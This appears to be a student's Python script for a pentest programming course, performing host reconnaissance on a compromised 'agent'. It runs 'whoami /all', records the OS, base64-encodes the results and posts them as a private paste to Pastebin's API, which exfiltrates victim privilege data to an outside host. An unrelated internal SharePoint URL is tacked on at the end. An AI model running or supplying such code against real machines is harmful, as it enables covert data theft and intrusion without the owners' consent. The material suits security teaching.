# Felisha Miranda 2301875540
# GSLC Programming for Pentest - Host Reconnaissance on Agent

from subprocess import PIPE, Popen
import sys
import requests
import platform
import base64

#adding victim os to report
report = f"OS Agent =  {platform.platform()}\n"

#sending user infos and privileges using the whoami command
process = Popen("whoami /all", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
result, error = process.communicate()

#adding command result to the report
if result == b'':
    report += f"error: "
    report += error.decode()
else:
    report += f"result: "
    report += result.decode()

#encoding the report using base64
report = base64.b64encode(report.encode())

#pastebin api stuff
pastebinURL = "https://pastebin.com/api/api_post.php"
pastebinAPIKey = "some_random_keys" #do adjust to actual api key

#data that will be sent to the endpoint
data = {
    'api_dev_key': pastebinAPIKey,
    'api_option': 'paste',
    'api_paste_private': '1',
    'api_paste_code': report
}

#sending api request
try:
    req = requests.post("https://pastebin.com/api/api_post.php", data=data)
    print(f"result link here = {req.text}")
except Exception as err:
    print("cant send request. error occured: \n")
    print(err)
    sys.exit()
    
    
    
   https://ptfiapps.fmi.com/sites/CustomAppsDevOps/PaaS/Deployments/Forms/AllItems.aspx?RootFolder=%2Fsites%2FCustomAppsDevOps%2FPaaS%2FDeployments%2FOperationsForm&FolderCTID=0x01200000DCBB497D88CE4E95A1EEC1E9C633BA&View=%7BABF3E6C3-C9B2-499F-9172-1BA509972853%7D
